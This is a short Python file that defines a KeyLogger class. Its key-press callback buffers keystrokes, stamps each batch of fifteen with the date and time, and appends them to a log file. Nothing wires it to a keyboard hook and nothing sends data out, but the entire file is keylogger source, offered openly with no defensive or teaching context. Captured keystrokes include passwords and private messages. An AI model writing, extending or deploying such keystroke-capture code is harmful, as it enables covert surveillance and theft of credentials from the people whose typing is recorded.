import time

class KeyLogger():
    def __init__(self, log_path):
        self.log_path = log_path
        self.word_counts = 0
        self.keys = []

    def get_date(self):
        return time.strftime("%d/%m/%Y %H:%M:%S %z | ")

    def on_press(self, key):
        self.keys.append(key)
        self.word_counts += 1
        if(self.word_counts >= 15):
            self.word_counts = 0
            self.keys.append("\n")
            self.keys.insert(0, self.get_date())
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, key_arr):
        with open(self.log_path, "a") as f:
            for key in key_arr:
                ke = str(key).replace("'", "")
                if ke.find("Key.") != -1:
                    f.write(ke.replace("Key.", "<") + ">")
                if ke.find("Key") == -1:
                    f.write(ke)